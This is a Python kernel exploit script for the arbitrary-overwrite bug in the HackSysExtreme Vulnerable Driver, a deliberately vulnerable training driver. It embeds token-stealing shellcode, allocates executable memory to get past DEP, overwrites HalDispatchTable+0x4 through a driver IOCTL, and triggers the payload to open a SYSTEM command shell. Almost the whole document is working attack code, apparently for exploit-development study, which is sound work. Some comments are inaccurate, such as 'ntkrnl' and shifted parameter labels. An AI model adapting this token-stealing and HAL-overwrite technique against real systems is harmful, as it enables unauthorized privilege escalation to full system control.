# HackSysExtreme Vulnerable Driver Kernel Exploit (Arbitrary Overwrite)
# Author: Connor McGarr

import struct
import sys
import os
from ctypes import *
from subprocess import *

# DLLs for Windows API interaction
kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi

class WriteWhatWhere(Structure):
    _fields_ = [
        ("What", c_void_p),
        ("Where", c_void_p)
    ]

payload = ""
payload += bytearray(
    "\x90\x90\x90"                    # NOP sled
    "\x60"                            # pushad
    "\x31\xc0"                        # xor eax,eax
    "\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
    "\x8b\x40\x50"                    # mov eax,[eax+0x50]
    "\x89\xc1"                        # mov ecx,eax
    "\xba\x04\x00\x00\x00"            # mov edx,0x4
    "\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]
    "\x2d\xb8\x00\x00\x00"            # sub eax,0xb8
    "\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx
    "\x75\xed"                        # jnz 0x1a
    "\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]
    "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx
    "\x61"                            # popad
    "\x5d"                            # pop ebp
    "\xc2\x08\x00"                    # ret 0x8
)

# Defeating DEP with VirtualAlloc. Creating RWX memory, and copying our shellcode in that region.
print "[+] Allocating RWX region for shellcode"
ptr = kernel32.VirtualAlloc(
    c_int(0),                         # lpAddress
    c_int(len(payload)),              # dwSize
    c_int(0x3000),                    # flAllocationType
    c_int(0x40)                       # flProtect
)

# Creates a ctype variant of the payload (from_buffer)
c_type_buffer = (c_char * len(payload)).from_buffer(payload)

print "[+] Copying shellcode to newly allocated RWX region"
kernel32.RtlMoveMemory(
    c_int(ptr),                       # Destination (pointer)
    c_type_buffer,                    # Source (pointer)
    c_int(len(payload))               # Length
)

# Python, when using id to return a value, creates an offset of 20 bytes
# After id returns the value, it is then necessary to increate the returned value 20 bytes
payload_address = id(payload) + 20
payload_updated = struct.pack("<L", ptr)
payload_final = id(payload_updated) + 20

# Location of shellcode update statement
print "[+] Location of shellcode: {0}".format(hex(payload_updated))

# Location of pointer to shellcode
print "[+] Location of pointer to shellcode: {0}".format(hex(payload_final))

# The goal is to eventually locate HAL table.
# HAL is exported by ntkrnl.exe
# ntkrnl.exe's location can be enumerated via EnumDeviceDrivers() and GetDEviceDriverBaseNameA() functions via Windows API.

# Enumerating addresses for all drivers via EnumDeviceDrivers()
base = (c_ulong * 1024)()
get_drivers = psapi.EnumDeviceDrivers(
    byref(base),                      # lpImageBase (array that receives list of addresses
    c_int(1024),                      # cb (size of lpImageBase array, in bytes)
    byref(c_long())                   # lpcbNeeded (bytes returned in the array)
)

# Error handling if function fails
if not base:
    print "[+] EnumDeviceDrivers() function call failed!"
    sys.exit(-1)

# Cycle through enumerated addresses, for ntkrnl.exe using GetDeviceDriverBaseNameA()
for base_address in base:
    if not base_address:
        continue
    current_name = c_char_p('\x00' * 1024)
    driver_name = psapi.GetDeviceDriverBaseNameA(
        base_address,                 # ImageBase (load address of current device driver)
        current_name,                 # lpFilename
        48                            # nSize (size of the buffer, in chars)
    )

    # Error handling if function fails
    if not driver_name:
        print "[+] GetDeviceDriverBaseNameA() function call failed!"
        sys.exit(-1)

    if current_name.value.lower() == 'ntkrnl' or 'ntkrnl' in current_name.value.lower():

        # When ntkrnl.exe is found, return the value at the time of being found
        current_name = current_name.value

        # Print update to show address of ntkrnl.exe
        print "[+] Found address of ntkrnl.exe at: {0}".format(hex(base_address))

        # It assumed the information needed from the for loop has been found if the program has reached execution at this point.
        # Stopping the for loop to move on.
        break
    
# Now that all of the proper information to reference HAL has been enumerated, it is time to get the location of HAL and HAL 0x4
# NtQueryIntervalProfile is an undocumented Windows API function that references HAL at the location of HAL +0x4.
# HAL +0x4 is the address we will eventually need to write over. Once HAL is exported, we will be most interested in HAL + 0x4

# Beginning enumeration
kernel_handle = kernel32.LoadLibraryExA(
    current_name,                       # lpLibFileName (specifies the name of the module, in this case ntlkrnl.exe)
    None,                               # hFile (parameter must be null
    0x00000001                          # dwFlags (DONT_RESOLVE_DLL_REFERENCES)
)

# Error handling if function fails
if not kernel_handle:
    print "[+] LoadLibraryExA() function failed!"
    sys.exit(-1)

# Getting HAL Address
hal = kernel32.GetProcAddress(
    kernel_handle,                      # hModule (handle passed via LoadLibraryExA to ntkrnl.exe)
    'HalDispatchTable'                  # lpProcName (name of value)
)

# Subtracting ntkrnl base in user land
hal -= kernel_handle

# Add base address of ntkrnl in kernel land
hal += base_address

# Recall earlier we were more interested in HAL + 0x4. Let's grab that address.
real_hal = hal + 0x4

# Print update with HAL and HAL + 0x4 location
print "[+] HAL location: {0}".format(hex(hal))
print "[+] HAL + 0x4 location: {0}".format(hex(real_hal))

# Referencing class created at the beginning of the sploit and passing shellcode to vulnerable pointers
# This is where the exploit occurs
write_what_where = WriteWhatWhere()
write_what_where.What = payload_final   # What we are writing (our shellcode)
write_what_where.Where = real_hal       # Where we are writing it to (HAL + 0x4). NtQueryIntervalProfile() will eventually call this location and execute it
write_what_where_pointer = pointer(write_what_where)

# Print update statement to reflect said exploit
print "[+] What: {0}".format(hex(write_what_where.What))
print "[+] Where: {0}".format(hex(write_what_where.Where))

# Getting handle to driver to return to DeviceIoControl() function
print "[+] Using CreateFileA() to obtain and return handle referencing the driver..."
handle = kernel32.CreateFileA(
    "\\\\.\\HackSysExtremeVulnerableDriver",
    0xC0000000,                         # lpFileName
    0,                                  # dwDesiredAccess
    None,                               # dwShareMode
    0x3,                                # lpSecurityAttributes
    0,                                  # dwCreationDisposition
    None                                # hTemplateFile
)

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x002200B,                          # dwIoControlCode
    write_what_where_pointer,           # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)
    
# Actually calling NtQueryIntervalProfile function, which will call HAL + 0x4, where our shellcode will be waiting.
ntdll.NtQueryIntervalProfile(
    0x1234,
    byref(c_ulong())
)

# Print update for nt_autority\system shell
print "[+] HOLD UP HAX0RZ! NT_AUTHORITRY\SYSTEM SHELL INCOMING!!!!"
Popen("start cmd", shell=True)
